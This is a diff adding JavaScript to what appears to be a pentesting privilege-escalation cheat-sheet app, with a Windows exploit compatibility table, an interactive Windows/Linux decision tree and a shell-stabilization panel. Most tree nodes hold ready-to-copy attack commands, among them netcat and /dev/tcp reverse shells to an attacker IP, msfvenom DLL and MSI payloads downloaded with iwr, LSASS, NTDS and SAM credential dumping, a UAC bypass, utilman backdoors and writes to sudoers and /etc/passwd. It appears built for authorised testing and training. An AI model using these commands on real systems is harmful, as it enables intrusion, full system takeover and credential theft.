+  {n:'SeDebugPrivilege',s:'win-exploits',t:'token',r:'SeDebugPrivilege',c:['✓','✓','✓','✓','✓','✓','✓']},
+  {n:'SeLoadDriverPriv',s:'win-exploits',t:'token',r:'SeLoadDriverPrivilege',c:['✓','✓','✓','✓','✓','✓','✓']},
+  {n:'SeManageVolumePriv',s:'win-exploits',t:'token',r:'SeManageVolumePrivilege',c:['✓','✓','✓','✓','✓','✓','✓']},
+  {n:'SeRestorePrivilege',s:'win-exploits',t:'token',r:'SeRestorePrivilege',c:['✓','✓','✓','✓','✓','✓','✓']},
+  {n:'PrintNightmare LPE',s:'win-exploits',t:'cve',r:'Spooler running + no KB5004945',c:['✗','✗','✓','✓','✓','⚡','✗']},
+  {n:'CVE-2023-29360',s:'win-exploits',t:'cve',r:'No KB5027215',c:['✗','✗','✗','✗','✓','✓','✓']},
+  {n:'EternalBlue MS17-010',s:'win-exploits',t:'cve',r:'SMBv1 enabled + no MS17-010 patch',c:['✓','✓','✓','✗','✗','✗','✗']},
+  {n:'ADCS ESC1',s:'win-adcs',t:'ad',r:'ADCS + vulnerable template (certipy)',c:['✗','✗','✓','✓','✓','✓','✓']},
+  {n:'Kerberoasting',s:'win-kerberoast',t:'ad',r:'Domain user + SPN on svc account',c:['✓','✓','✓','✓','✓','✓','✓']},
+  {n:'DCSync / WriteDACL',s:'win-dcsync',t:'ad',r:'DS-Replication-Get-Changes-All',c:['✓','✓','✓','✓','✓','✓','✓']},
+  {n:'Shadow Creds / RBCD',s:'win-shadowcred',t:'ad',r:'GenericAll on computer, Srv2016+',c:['✗','✗','✓','✓','✓','✓','✓']},
+  {n:'DNSAdmins DLL',s:'win-dnsadmins',t:'ad',r:'DNSAdmins group membership',c:['⚡','⚡','✓','✓','✓','✓','✓']},
+  {n:'GPP cpassword',s:'win-gpp',t:'ad',r:'Legacy GPP in SYSVOL (pre-2014)',c:['✓','⚡','⚡','⚡','⚡','⚡','⚡']},
+  {n:'LAPS Read',s:'win-laps',t:'ad',r:'Read ms-Mcs-AdmPwd in AD',c:['✗','⚡','✓','✓','✓','✓','✓']},
+  {n:'MSSQL xp_cmdshell',s:'win-mssql',t:'misc',r:'MSSQL sysadmin / SA account',c:['✓','✓','✓','✓','✓','✓','✓']},
+  {n:'NSClient++ Abuse',s:'win-nsclient',t:'misc',r:'NSClient++ running, API password',c:['⚡','⚡','⚡','⚡','⚡','⚡','⚡']},
+];
+
+const COMPAT_HDRS = ['Exploit','Type','Win7/Srv2008R2','Srv2012R2/8.1','Win10 1607/Srv2016','Win10 1809/Srv2019','Win10 21H2','Srv2022','Win11','Requires'];
+const COMPAT_KEYS = ['n','t','c0','c1','c2','c3','c4','c5','c6','r'];
+let cSortK = null, cSortA = true;
+
+function renderCompat() {
+  const wrap = document.getElementById('compat-wrap');
+  if (!wrap) return;
+  const q = (document.getElementById('compat-filter')?.value || '').toLowerCase();
+  const data = COMPAT.map(r => ({...r})).sort((a,b) => {
+    if (!cSortK) return 0;
+    const ka = cSortK.startsWith('c') ? (a.c[+cSortK.slice(1)]||'') : (a[cSortK]||'');
+    const kb = cSortK.startsWith('c') ? (b.c[+cSortK.slice(1)]||'') : (b[cSortK]||'');
+    return cSortA ? ka.localeCompare(kb) : kb.localeCompare(ka);
+  });
+
+  let h = `<table class="compat-tbl"><thead><tr>`;
+  COMPAT_HDRS.forEach((hdr,i) => {
+    const k = COMPAT_KEYS[i]; const sorted = cSortK === k;
+    h += `<th class="${sorted?'cs':''}" onclick="cSort('${k}')">${hdr}${sorted?(cSortA?' ↑':' ↓'):''}</th>`;
+  });
+  h += `</tr></thead><tbody>`;
+
+  data.forEach(r => {
+    const rowTxt = (r.n+r.t+r.r+r.c.join('')).toLowerCase();
+    const vis = !q || rowTxt.includes(q);
+    h += `<tr class="${vis?'':'ch'}">`;
+    h += `<td class="cn"><a href="#${r.s}" onclick="closeModal('compat-modal')">${escHtml(r.n)}</a></td>`;
+    h += `<td><span class="ctype">${r.t}</span></td>`;
+    r.c.forEach(v => {
+      const cls = v==='✓'?'cy':v==='✗'?'cx':v==='⚡'?'cc':'cna';
+      h += `<td class="${cls}">${v}</td>`;
+    });
+    h += `<td class="creq">${escHtml(r.r)}</td></tr>`;
+  });
+  h += `</tbody></table>`;
+  wrap.innerHTML = h;
+}
+
+function cSort(k) {
+  if (cSortK === k) cSortA = !cSortA;
+  else { cSortK = k; cSortA = true; }
+  renderCompat();
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  FEATURE 4: DECISION TREE
+// ═══════════════════════════════════════════════════════════════
+const DT = {
+  win: {
+    root: {q:'What does `whoami /priv` show?',ctx:'whoami /priv | findstr /i "Se"',
+      opts:[{l:'SeImpersonate or SeAssignPrimaryToken',n:'potato'},
+            {l:'SeBackupPrivilege',n:'backup'},
+            {l:'SeDebugPrivilege',n:'debug'},
+            {l:'SeLoadDriverPrivilege',n:'loaddriver'},
+            {l:'SeManageVolumePrivilege',n:'managevol'},
+            {l:'SeRestorePrivilege',n:'restore'},
+            {l:'SeTakeOwnershipPrivilege',n:'takeown'},
+            {l:'All tokens disabled / no useful ones',n:'re_enable'},
+            {l:'No interesting privileges at all',n:'no_priv'}]},
+    re_enable: {q:'Tokens disabled? Re-enable with FullPowers first',ctx:'Tokens marked Disabled can still be exploited — re-enable them',
+      cmds:['# Download FullPowers to target first:','iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/FullPowers.exe -Outfile {{WPATH}}\\FullPowers.exe','{{WPATH}}\\FullPowers.exe  # spawns new shell with all default token privs restored','# Then re-run whoami /priv in the new shell'],s:'win-privs',
+      opts:[{l:'Tokens now enabled — re-check above',n:'root'}]},
+    potato: {q:'Which build? (systeminfo | findstr Build)',ctx:'GodPotato works on ALL builds — start there',
+      opts:[{l:'Any build — try GodPotato first (universal)',n:'godpotato'},
+            {l:'Build ≥ 18362 (Win10 1903+), no Spooler',n:'sigmapotato'},
+            {l:'Build 14393–17762 (Srv2016/Win10 pre-1809)',n:'printspoofer'},
+            {l:'Build < 14393 (Win7/2008/2012)',n:'juicypotato'}]},
+    godpotato: {q:'GodPotato — universal, try NET4 first then NET2',final:true,s:'win-potatoes',
+      cmds:['{{WPATH}}\\GodPotato-NET4.exe -cmd "whoami"',
+            '{{WPATH}}\\GodPotato-NET4.exe -cmd "{{WPATH}}\\nc64.exe -e cmd.exe {{KALI_IP}} {{RPORT}}"',
+            '# If .NET4 fails → try NET2:','{{WPATH}}\\GodPotato-NET2.exe -cmd "{{WPATH}}\\nc64.exe -e cmd.exe {{KALI_IP}} {{RPORT}}"']},
+    printspoofer: {q:'PrintSpoofer → check Spooler first, then SweetPotato as fallback',final:true,s:'win-potatoes',
+      cmds:['sc query spooler | findstr RUNNING','{{WPATH}}\\PrintSpoofer64.exe -c "{{WPATH}}\\nc64.exe -e cmd.exe {{KALI_IP}} {{RPORT}}"',
+            '# Fallback if Spooler stopped:','{{WPATH}}\\SweetPotato.exe -a "{{WPATH}}\\nc64.exe -e cmd.exe {{KALI_IP}} {{RPORT}}"']},
+    sigmapotato: {q:'SigmaPotato (no Spooler needed, build ≥ 18362)',final:true,s:'win-potatoes',
+      cmds:['{{WPATH}}\\SigmaPotato.exe "cmd /c {{WPATH}}\\nc64.exe -e cmd.exe {{KALI_IP}} {{RPORT}}"']},
+    juicypotato: {q:'JuicyPotato — need correct CLSID for the target build',final:true,s:'win-potatoes',
+      cmds:['# Get CLSID: https://github.com/ohpe/juicy-potato/tree/master/CLSID',
+            '{{WPATH}}\\JuicyPotato.exe -l 1337 -c {CLSID} -t * -p "{{WPATH}}\\nc64.exe" -a "-e cmd.exe {{KALI_IP}} {{RPORT}}"']},
+    backup: {q:'SeBackupPrivilege — DC or workstation?',
+      opts:[{l:'Domain Controller (dump ALL domain hashes via NTDS)',n:'backup_dc'},
+            {l:'Regular server/workstation (dump local SAM)',n:'backup_sam'}]},
+    backup_dc: {q:'Dump NTDS.dit via robocopy /B (backup mode bypasses ACLs)',final:true,s:'win-exploits',
+      cmds:['robocopy /B /MIR /ZB C:\\Windows\\NTDS {{WPATH}}\\ntds_copy',
+            'reg save hklm\\system {{WPATH}}\\system.hive',
+            '# Transfer ntds_copy\\ + system.hive to Kali, then:',
+            'impacket-secretsdump -ntds {{WPATH}}\\ntds_copy\\ntds.dit -system system.hive LOCAL']},
+    backup_sam: {q:'Dump SAM + SYSTEM + SECURITY hives directly',final:true,s:'win-sam',
+      cmds:['reg save hklm\\sam {{WPATH}}\\sam.hive',
+            'reg save hklm\\system {{WPATH}}\\system.hive',
+            'reg save hklm\\security {{WPATH}}\\security.hive',
+            '# Transfer to Kali:','impacket-secretsdump -sam sam.hive -system system.hive -security security.hive local']},
+    debug: {q:'SeDebugPrivilege → inject into winlogon.exe or dump LSASS',final:true,s:'win-exploits',
+      cmds:['tasklist /fi "IMAGENAME eq winlogon.exe"  # get PID',
+            '{{WPATH}}\\SeDebugPrivesc.exe <WINLOGON_PID> cmd.exe',
+            '# LSASS dump alternative:',
+            'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump (Get-Process lsass).Id {{WPATH}}\\lsass.dmp full',
+            '# Transfer lsass.dmp to Kali → pypykatz lsa minidump lsass.dmp']},
+    loaddriver: {q:'SeLoadDriverPrivilege → load Capcom.sys → SYSTEM via ExploitCapcom',final:true,s:'win-exploits',
+      cmds:['{{WPATH}}\\eoploaddriver.exe System\\CurrentControlSet\\dfserv {{WPATH}}\\Capcom.sys',
+            '{{WPATH}}\\ExploitCapcom.exe LOAD {{WPATH}}\\Capcom.sys','{{WPATH}}\\ExploitCapcom.exe',
+            '# RESTORE: reg delete HKLM\\System\\CurrentControlSet\\dfserv /f']},
+    managevol: {q:'SeManageVolumePrivilege → write tzres.dll to wbem → trigger via systeminfo',final:true,s:'win-exploits',
+      cmds:['{{WPATH}}\\SeManageVolumeExploit.exe',
+            '# Kali: msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o tzres.dll',
+            'iwr -uri http://{{KALI_IP}}:{{PORT}}/tzres.dll -OutFile "C:\\Windows\\System32\\wbem\\tzres.dll"',
+            'systeminfo  # trigger DLL load → reverse shell fires']},
+    restore: {q:'SeRestorePrivilege → SeRestoreAbuse.exe (clean) or utilman swap',final:true,s:'win-exploits',
+      cmds:['{{WPATH}}\\SeRestoreAbuse.exe "{{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e powershell.exe"',
+            '# Manual utilman swap:',
+            'copy C:\\Windows\\system32\\Utilman.exe C:\\Windows\\system32\\Utilman.exe.bak',
+            'copy C:\\Windows\\system32\\cmd.exe C:\\Windows\\system32\\Utilman.exe',
+            '# Lock screen → Win+U at login = SYSTEM CMD']},
+    takeown: {q:'SeTakeOwnershipPrivilege → take utilman.exe, swap for cmd.exe',final:true,s:'win-exploits',
+      cmds:['copy C:\\Windows\\system32\\Utilman.exe C:\\Windows\\system32\\Utilman.exe.bak',
+            'takeown.exe /f C:\\Windows\\system32\\Utilman.exe',
+            'icacls.exe C:\\Windows\\system32\\Utilman.exe /grant "%username%":F',
+            'copy C:\\Windows\\system32\\cmd.exe C:\\Windows\\system32\\Utilman.exe',
+            '# Lock screen (Win+L) → Win+U at login screen = SYSTEM CMD']},
+    no_priv: {q:'No useful token privs → check service misconfigurations',ctx:'Run winPEAS / SharpUp first for quick wins',
+      opts:[{l:'Writable service binary / directory',n:'svcbin'},
+            {l:'Unquoted service path in writable dir',n:'uqpath'},
+            {l:'AlwaysInstallElevated (both reg keys = 1)',n:'aie'},
+            {l:'Weak registry DACL on service key',n:'regdacl'},
+            {l:'Scheduled task binary is writable',n:'schtask'},
+            {l:'UAC active (medium integrity shell)',n:'uac'},
+            {l:'Credentials found / cleartext pass',n:'creds'},
+            {l:'Nothing obvious yet → go deep',n:'deep'}]},
+    svcbin: {q:'Service binary writable → replace with payload, restart service',final:true,s:'win-svcbin',
+      cmds:['{{WPATH}}\\accesschk.exe -uwcqv "Everyone" * /accepteula 2>nul',
+            'sc.exe config <ServiceName> binPath= "cmd /c {{WPATH}}\\nc64.exe -e cmd.exe {{KALI_IP}} {{RPORT}}"',
+            'sc.exe stop <ServiceName> && sc.exe start <ServiceName>',
+            '# OR if no restart: net stop <ServiceName> /y && net start <ServiceName>']},
+    uqpath: {q:'Unquoted path → place exe at space split point',final:true,s:'win-uqpath',
+      cmds:['wmic service get name,pathname | findstr /i /v "c:\\\\windows\\\\"',
+            '# C:\\Program Files\\My App\\service.exe → try C:\\Program.exe or C:\\Program Files\\My.exe',
+            '# Copy payload to split point, then restart service']},
+    aie: {q:'AlwaysInstallElevated → MSI runs as SYSTEM',final:true,s:'win-aie',
+      cmds:['reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
+            'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
+            '# Kali: msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f msi -o evil.msi',
+            'iwr -uri http://{{KALI_IP}}:{{PORT}}/evil.msi -Outfile {{WPATH}}\\evil.msi',
+            'msiexec /quiet /qn /i {{WPATH}}\\evil.msi']},
+    regdacl: {q:'Weak registry DACL → overwrite ImagePath with payload',final:true,s:'win-regdacl',
+      cmds:['# Confirm writable (PS): (Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<Svc>).Access',
+            'reg add HKLM\\System\\CurrentControlSet\\Services\\<Svc> /v ImagePath /t REG_EXPAND_SZ /d "cmd /c {{WPATH}}\\nc64.exe -e cmd.exe {{KALI_IP}} {{RPORT}}" /f',
+            'sc.exe stop <Svc> && sc.exe start <Svc>']},
+    schtask: {q:'Scheduled task binary writable → replace binary, wait for trigger',final:true,s:'win-schtask',
+      cmds:['schtasks /query /fo LIST /v | findstr /i "Task Name\\|Run As User\\|Task To Run\\|Next Run"',
+            'copy "C:\\Path\\TaskBin.exe" "C:\\Path\\TaskBin.exe.bak"',
+            'copy {{WPATH}}\\shell.exe "C:\\Path\\TaskBin.exe"',
+            '# Wait for next run, or: schtasks /run /tn "<TaskName>"']},
+    uac: {q:'UAC bypass → fodhelper registry hijack (most reliable)',final:true,s:'win-uac',
+      cmds:['# Confirm medium integrity:', 'whoami /groups | findstr "Medium"',
+            'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "{{WPATH}}\\nc64.exe -e cmd.exe {{KALI_IP}} {{RPORT}}" /f',
+            'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d "" /f',
+            'fodhelper.exe',
+            '# RESTORE: reg delete HKCU\\Software\\Classes\\ms-settings /f']},
+    creds: {q:'Credentials found → pass-the-hash or login',final:true,s:'win-creds',
+      cmds:['crackmapexec smb {{TARGET}} -u {{USER}} -p {{PASS}}',
+            'evil-winrm -i {{TARGET}} -u {{USER}} -p {{PASS}}',
+            'impacket-psexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{TARGET}}',
+            '{{WPATH}}\\RunasCs.exe {{USER}} {{PASS}} cmd.exe']},
+    deep: {q:'Nothing obvious → run Snaffler + LaZagne + check PS history',final:true,s:'win-deepenum',
+      cmds:['# PS history (gold mine):',
+            'type C:\\Users\\{{USER}}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',
+            '# Check all users history:','Get-ChildItem C:\\Users -ErrorAction SilentlyContinue | % { cat "$($_.FullName)\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" 2>$null }',
+            '{{WPATH}}\\Snaffler.exe -s -d {{DOMAIN}} -o {{WPATH}}\\snaffler.log -v data',
+            '{{WPATH}}\\LaZagne.exe all']},
+  },
+  lin: {
+    root: {q:'What does `sudo -l` show?',ctx:'sudo -l — always run this first, fastest path to root',
+      opts:[{l:'NOPASSWD entry for a binary',n:'sudo_bin'},
+            {l:'NOPASSWD for a script I might control',n:'sudo_script'},
+            {l:'env_keep includes LD_PRELOAD',n:'ldpreload'},
+            {l:'sudoedit or sudo -e allowed',n:'sudoedit'},
+            {l:'(ALL) NOPASSWD: ALL — instant root',n:'sudo_all'},
+            {l:'Needs password / not in sudoers',n:'no_sudo'}]},
+    sudo_all: {q:'(ALL) NOPASSWD: ALL → sudo su or sudo bash',final:true,s:'lin-sudo',
+      cmds:['sudo su -','sudo bash','sudo /bin/bash']},
+    sudo_bin: {q:'NOPASSWD binary → check GTFOBins for sudo exploit',final:true,s:'lin-suid',
+      cmds:['# Check built-in GTFOBins lookup in the guide (§ Linux SUID/Sudo)',
+            'sudo python3 -c \'import os;os.system("/bin/bash")\'',
+            'sudo vim -c \':!/bin/bash\'',
+            'sudo find / -exec /bin/bash \\; -quit',
+            'sudo awk \'BEGIN {system("/bin/bash")}\'',
+            'sudo perl -e \'exec "/bin/bash";\'']},
+    sudo_script: {q:'NOPASSWD script → can you write to it?',final:true,s:'lin-cron',
+      cmds:['ls -la /path/to/sudo/script','# If writable:',
+            'echo "bash -i >& /dev/tcp/{{KALI_IP}}/{{RPORT}} 0>&1" >> /path/to/script',
+            'sudo /path/to/script']},
+    ldpreload: {q:'env_keep LD_PRELOAD → compile malicious .so and inject',final:true,s:'lin-ldpreload',
+      cmds:['# Compile on target (or cross-compile on Kali):',
+            'cat > /tmp/pe.c << "EOF"\n#include<stdio.h>\n#include<stdlib.h>\nvoid _init(){unsetenv("LD_PRELOAD");system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");}\nEOF',
+            'gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles',
+            'sudo LD_PRELOAD=/tmp/pe.so <any_allowed_binary>',
+            '/tmp/rootbash -p  # SUID bash → root']},
+    sudoedit: {q:'sudoedit → CVE-2023-22809 or edit sensitive files',final:true,s:'lin-sudo',
+      cmds:['# CVE-2023-22809 (sudo < 1.9.12p2):',
+            'EDITOR="vim -- /etc/sudoers" sudoedit /path/to/allowed/file',
+            '# Add to sudoers: youruser ALL=(ALL) NOPASSWD: ALL',
+            '# Or edit /etc/passwd if in allowed path']},
+    no_sudo: {q:'No sudo → check SUID binaries',ctx:'find / -perm -4000 -type f 2>/dev/null',
+      opts:[{l:'Non-standard SUID binary found',n:'suid_hit'},
+            {l:'Only standard system SUIDs (passwd, pkexec, etc.)',n:'standard_suid'},
+            {l:'No SUID at all',n:'no_suid'}]},
+    suid_hit: {q:'SUID binary found → GTFOBins SUID lookup',final:true,s:'lin-suid',
+      cmds:['# Use the GTFOBins section in the guide for the exact command',
+            '# bash -p → if /bin/bash has SUID: /bin/bash -p',
+            '# python3 cap_setuid: python3 -c "import os;os.setuid(0);os.execl(\'/bin/bash\',\'bash\',\'-p\')"',
+            '# find SUID: find . -exec /bin/bash -p \\; -quit',
+            '# Common: /usr/bin/vim -c \':!/bin/bash -p\'']},
+    standard_suid: {q:'Standard SUIDs → check capabilities',ctx:'/usr/sbin/getcap -r / 2>/dev/null || getcap -r / 2>/dev/null',
+      opts:[{l:'cap_setuid found on python/node/perl/ruby',n:'cap_setuid'},
+            {l:'cap_dac_override or cap_net_raw',n:'cap_other'},
+            {l:'No useful capabilities',n:'no_caps'}]},
+    cap_setuid: {q:'cap_setuid → setuid(0) then exec bash',final:true,s:'lin-caps',
+      cmds:['python3 -c "import os;os.setuid(0);os.execl(\'/bin/bash\',\'bash\',\'-p\')"',
+            'perl -e "use POSIX qw(setuid);setuid(0);exec \'/bin/bash\';"',
+            'ruby -e "Process::Sys.setuid(0); exec \'/bin/bash\'"']},
+    cap_other: {q:'cap_dac_override → read/write any file',final:true,s:'lin-caps',
+      cmds:['# With cap_dac_override (e.g., on python3):',
+            'python3 -c "f=open(\'/etc/sudoers\',\'a\');f.write(\'\\nyouruser ALL=(ALL) NOPASSWD: ALL\\n\');f.close()"',
+            'sudo su -']},
+    no_caps: {q:'No caps → monitor cron with pspy64 for 2+ minutes',ctx:'./pspy64 -pf -i 1000',
+      opts:[{l:'Cron job executes a writable script',n:'cron_write'},
+            {l:'Cron PATH is hijackable (writable dir before system dirs)',n:'cron_path'},
+            {l:'No exploitable cron found',n:'no_cron'}]},
+    cron_write: {q:'Writable cron script → inject reverse shell payload',final:true,s:'lin-cron',
+      cmds:['echo "bash -i >& /dev/tcp/{{KALI_IP}}/{{RPORT}} 0>&1" >> /path/to/cron/script',
+            '# Wait for next execution — watch with pspy64']},
+    cron_path: {q:'Cron PATH hijack → place malicious binary earlier in PATH',final:true,s:'lin-cron',
+      cmds:['cat /etc/crontab | head -5  # note PATH=',
+            'echo \'#!/bin/bash\nbash -i >& /dev/tcp/{{KALI_IP}}/{{RPORT}} 0>&1\' > ~/curl',
+            'chmod +x ~/curl','# Wait for cron to run the script that calls curl without full path']},
+    no_suid: {q:'No SUID → check config files and /etc/passwd',
+      opts:[{l:'/etc/passwd is world-writable',n:'etc_passwd'},
+            {l:'NFS share with no_root_squash',n:'nfs'},
+            {l:'fail2ban or update-motd.d writable',n:'motd'},
+            {l:'Kernel version might be vulnerable',n:'kernel'},
+            {l:'Nothing obvious → deep dive',n:'lin_deep'}]},
+    no_cron: {q:'No cron abuse → check file writability',
+      opts:[{l:'/etc/passwd writable',n:'etc_passwd'},
+            {l:'NFS no_root_squash',n:'nfs'},
+            {l:'Kernel might be exploitable',n:'kernel'},
+            {l:'Nothing → run LinPEAS and go deep',n:'lin_deep'}]},
+    etc_passwd: {q:'Writable /etc/passwd → inject root user with no password check',final:true,s:'lin-passwd',
+      cmds:['ls -la /etc/passwd','echo "newroot:$(openssl passwd -1 Password123):0:0:root:/root:/bin/bash" >> /etc/passwd','su newroot  # Password: Password123']},
+    nfs: {q:'NFS no_root_squash → Kali mounts share, creates SUID bash',final:true,s:'lin-nfs',
+      cmds:['cat /etc/exports | grep -v "^#" | grep no_root_squash',
+            '# On Kali (as root):', 'mkdir /mnt/nfs && mount -t nfs -o rw,vers=3 {{TARGET}}:/share /mnt/nfs',
+            'cp /bin/bash /mnt/nfs/rootbash && chmod +s /mnt/nfs/rootbash',
+            '# On target:', '/share/rootbash -p  # → root shell']},
+    motd: {q:'writable update-motd.d or fail2ban actionban → root on trigger',final:true,s:'lin-motd',
+      cmds:['ls -la /etc/update-motd.d/  # writable = instant root on SSH login',
+            'echo "bash -i >& /dev/tcp/{{KALI_IP}}/{{RPORT}} 0>&1" >> /etc/update-motd.d/00-header',
+            '# Trigger: SSH login to the box',
+            '# fail2ban: ls -la /etc/fail2ban/action.d/ → writable .conf → edit actionban']},
+    kernel: {q:'Kernel exploit → parse your kernel version with SI Parser first',final:true,s:'lin-kernel',
+      cmds:['uname -r','# Use "🔍 Parse" button in topbar — paste uname -a output',
+            '# Manual check:','wget http://{{KALI_IP}}:{{PORT}}/linux/linux-exploit-suggester.sh -O /tmp/les.sh && chmod +x /tmp/les.sh && /tmp/les.sh',
+            '/usr/sbin/getcap -r / 2>/dev/null || getcap -r / 2>/dev/null']},
+    lin_deep: {q:'Deep dive → LinPEAS + pspy + bash history + all config files',final:true,s:'lin-deepenum',
+      cmds:['wget http://{{KALI_IP}}:{{PORT}}/linux/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/lp.log',
+            './pspy64 -pf -i 1000  # run for 5+ minutes',
+            'cat ~/.bash_history 2>/dev/null; cat /home/*/.bash_history 2>/dev/null',
+            'find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "pass\\|password" 2>/dev/null | head -20',
+            'find / -writable -type f ! -path "*/proc/*" 2>/dev/null | grep -v "^/sys"']},
+  }
+};
+
+let dtOS = 'win', dtStack = [];
+
+function dtInit() { dtStack = []; renderDT('root'); }
+function setDTOS(os) {
+  dtOS = os;
+  document.getElementById('dtt-win').classList.toggle('active', os==='win');
+  document.getElementById('dtt-lin').classList.toggle('active', os==='lin');
+  dtStack = [];
+  renderDT('root');
+}
+function dtReset() { dtStack = []; renderDT('root'); }
+function dtNav(nid, label) { dtStack.push({id:nid, label}); renderDT(nid); }
+function dtBack() { dtStack.pop(); renderDT(dtStack.length ? dtStack[dtStack.length-1].id : 'root'); }
+
+function renderDT(nid) {
+  const tree = DT[dtOS];
+  const node = tree[nid];
+  if (!node) return;
+  const vars = getVars();
+  let h = '';
+
+  if (dtStack.length > 1) {
+    h += `<button class="dt-back" onclick="dtBack()">&#8592; Back</button>`;
+    h += `<div class="dt-crumb">${dtStack.map(x=>escHtml(x.label||x.id)).join(' › ')}</div>`;
+  }
+
+  const fin = node.final;
+  h += `<div class="dt-node${fin?' fin':''}">`;
+  h += `<div class="dt-q">${fin?'&#9989; ':'&#128073; '}${escHtml(node.q)}</div>`;
+  if (node.ctx) h += `<div class="dt-ctx">${escHtml(node.ctx)}</div>`;
+
+  if (node.cmds) {
+    h += `<div class="dt-cmds"><div class="dt-cmds-label">Commands — click to copy</div>`;
+    node.cmds.forEach(cmd => {
+      const filled = cmd.replace(/\{\{(\w+)\}\}/g, (_,k) => vars[k]||`{{${k}}}`);
+      h += `<pre class="dt-cmd">${escHtml(filled)}</pre>`;
+    });
+    h += `</div>`;
+  }
+  if (node.s) h += `<a class="dt-sec" href="#${node.s}" onclick="closeModal('dt-modal')">&#8594; Full instructions in §${node.s}</a>`;
+
+  if (node.opts) {
+    h += `<div class="dt-opts">`;
+    node.opts.forEach(opt => {
+      const child = tree[opt.n];
+      const isFin = child && child.final;
+      h += `<button class="dt-opt${isFin?' go':''}" onclick="dtNav('${opt.n}','${opt.l.replace(/'/g,"\\'")}')">
+        <span>${escHtml(opt.l)}</span><span>${isFin?'&#9989;':'&#9658;'}</span>
+      </button>`;
+    });
+    h += `</div>`;
+  }
+  h += `</div>`;
+
+  const out = document.getElementById('dt-out');
+  if (out) { out.innerHTML = h; out.querySelectorAll('pre.dt-cmd').forEach(p => { p.onclick = () => copyText(p.textContent.trim(), p); }); }
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  FEATURE 5: SHELL STABILIZATION PANEL
+// ═══════════════════════════════════════════════════════════════
+let stabOS = 'lin';
+function toggleStab() {
+  const p = document.getElementById('stab-panel');
+  p.classList.toggle('sc');
+  if (!p.classList.contains('sc')) renderStab();
+}
+function setStabOS(os) {
+  stabOS = os;
+  document.getElementById('stab-lin-btn').classList.toggle('active', os==='lin');
+  document.getElementById('stab-win-btn').classList.toggle('active', os==='win');
+  renderStab();
+}
+function renderStab() {
+  const c = document.getElementById('stab-out');
+  if (!c || document.getElementById('stab-panel').classList.contains('sc')) return;
+  const v = getVars();
+  const ip = v.KALI_IP, rport = v.RPORT, port = v.PORT, target = v.TARGET, user = v.USER, pass = v.PASS, wpath = v.WPATH;
+
+  if (stabOS === 'lin') {
+    c.innerHTML = `<div class="stab-steps">
+<div class="stab-step"><div class="stab-n">1</div><div class="stab-sc">
+  <div class="stab-lbl">Spawn PTY (on target)</div>
+  <pre class="stab-cmd">python3 -c 'import pty;pty.spawn("/bin/bash")'</pre>
+  <pre class="stab-cmd">script -qc /bin/bash /dev/null</pre>
+</div></div>
+<div class="stab-step"><div class="stab-n">2</div><div class="stab-sc">
+  <div class="stab-lbl">Background it (on target)</div>
+  <pre class="stab-cmd">CTRL+Z</pre>
+</div></div>
+<div class="stab-step"><div class="stab-n">3</div><div class="stab-sc">
+  <div class="stab-lbl">Fix raw mode + foreground (on Kali)</div>
+  <pre class="stab-cmd">stty raw -echo; fg</pre>
+</div></div>
+<div class="stab-step"><div class="stab-n">4</div><div class="stab-sc">
+  <div class="stab-lbl">Restore terminal (on target)</div>
+  <pre class="stab-cmd">export TERM=xterm; export SHELL=bash</pre>
+</div></div>
+<div class="stab-step"><div class="stab-n">5</div><div class="stab-sc">
+  <div class="stab-lbl">Fix terminal size (Kali: check → target: set)</div>
+  <pre class="stab-cmd">stty size</pre>
+  <pre class="stab-cmd">stty rows 38 cols 180</pre>
+</div></div>
+</div>
+<div class="stab-note">
+<strong>socat (best quality, needs socat on target):</strong><br>
+<pre class="stab-cmd"># Kali listener:
+socat file:\`tty\`,raw,echo=0 tcp-listen:${rport}</pre>
+<pre class="stab-cmd"># Target:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${rport}</pre>
+</div>`;
+  } else {
+    c.innerHTML = `<div class="stab-steps">
+<div class="stab-step"><div class="stab-n">1</div><div class="stab-sc">
+  <div class="stab-lbl">Upgrade dumb shell → PowerShell</div>
+  <pre class="stab-cmd">powershell -ep bypass -nop</pre>
+</div></div>
+<div class="stab-step"><div class="stab-n">2</div><div class="stab-sc">
+  <div class="stab-lbl">rlwrap on Kali (arrow keys + history)</div>
+  <pre class="stab-cmd">rlwrap nc -lvnp ${rport}</pre>
+</div></div>
+<div class="stab-step"><div class="stab-n">3</div><div class="stab-sc">
+  <div class="stab-lbl">ConPTY shell (best interactive — Kali)</div>
+  <pre class="stab-cmd">stty raw -echo; (stty size; cat) | nc -lvnp ${rport}</pre>
+  <pre class="stab-cmd"># Target: iwr http://${ip}:${port}/scripts/Invoke-ConPtyShell.ps1 -o ${wpath}\\c.ps1
+.\\c.ps1 ${ip} ${rport} -Rows 38 -Cols 180</pre>
+</div></div>
+<div class="stab-step"><div class="stab-n">4</div><div class="stab-sc">
+  <div class="stab-lbl">evil-winrm (best if port 5985 open)</div>
+  <pre class="stab-cmd">evil-winrm -i ${target} -u ${user} -p ${pass}</pre>
+</div></div>
+</div>`;
+  }
+  c.querySelectorAll('pre.stab-cmd').forEach(p => { p.onclick = () => copyText(p.textContent.trim(), p); });
 }
 
 // ── Fix GTFOBins copy for HTTP context ────────────────────────
